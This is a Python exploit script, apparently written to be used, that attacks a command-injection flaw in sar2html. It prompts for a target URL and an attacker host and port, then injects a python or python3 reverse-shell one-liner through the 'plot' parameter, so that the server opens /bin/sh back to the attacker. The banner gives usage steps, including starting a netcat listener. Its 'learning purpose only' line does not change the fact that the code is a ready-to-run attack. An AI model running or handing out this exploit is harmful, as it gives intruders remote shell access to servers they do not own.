#!/usr/bin/env python3

import requests
import time


print(
	"\n\n=====================================================================================\n"
	"				  EXPLOIT BY K1NGN4N0                                 \n"
	"                                                                                     \n"
	"                                                                                     \n"
	"                   EXPLOIT SAR2HTML RCE COULD LEED TO REVERSE SHELL                  \n"
	"            RCE IS AN VULNERABILITY THAT ALLOWS ATTACKER TO EXECUTE OS COMMAND       \n"
	"                                                                                     \n"
	"                               FOR LEARNING PURPOSE ONLY!!!                          \n"
	"                                                                                     \n"
	"                                                                                     \n"
	"            HOW TO USE:                                                              \n"
	"                                                                                     \n"
	"            1.	SETUP A LISTENER 'nc -nlvp <port>'                                    \n"
	"            2. RUN THE EXPLOIT                                                       \n"
	"            3. HACK THE PLANET                                                       \n"
	"                                                                                     \n"
	"            EXPLOIT TYPE 'BETA'                                                      \n"
	"=====================================================================================\n"
	)

print("put the url:")
url = input("url:>")
print("")
print("put the local host and the local port:\n========================================================")
lhost = input("\nlhost:>")
lport = input("\nlport:>")
print("")
print(
	"reverse shell:                                          \n"
	"======================================================= \n"
	"1.python                    status: 'working'           \n"
	"2.python3                   status: 'working'           \n"
	"3.php                       status: 'under construction'\n"
	"4.netcat reverse shell      status: 'under construction'\n"
	"======================================================= \n"
	)
reverse_shell = input("reverse_shell:>")
if reverse_shell == "1":
	r = requests.get(url + "?plot=LINUX;%20python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22" + lhost  + "%22," + lport  + "));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27")

if reverse_shell == "2":
	r = requests.get(url + "?plot=LINUX;%20python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22" + lhost  + "%22," + lport  + "));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27")
